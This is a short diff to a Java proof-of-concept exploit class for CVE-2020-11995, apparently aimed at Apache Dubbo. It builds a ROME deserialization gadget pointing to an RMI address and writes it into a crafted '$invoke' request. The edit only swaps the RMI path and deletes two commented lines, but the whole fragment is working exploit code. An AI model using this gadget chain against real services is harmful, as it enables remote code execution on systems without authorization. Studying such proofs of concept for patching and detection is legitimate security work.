@@ -17,7 +17,7 @@ import java.util.Random;
  */
 public class CVE_2020_11995 {
     public static void main(String[] args) throws Exception {
-        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/sbm9gt");
+        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/lc8yjj");
 
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
 
@@ -39,8 +39,6 @@ public class CVE_2020_11995 {
         out.writeUTF("0.0.0");
         out.writeUTF("$invoke");
         out.writeUTF("Ljava/util/Map;");
-//        out.writeUTF("$echo");
-//        out.writeUTF("Ljava/lang/Object;");
         out.writeObject(o);
         out.writeObject(new HashMap());
 
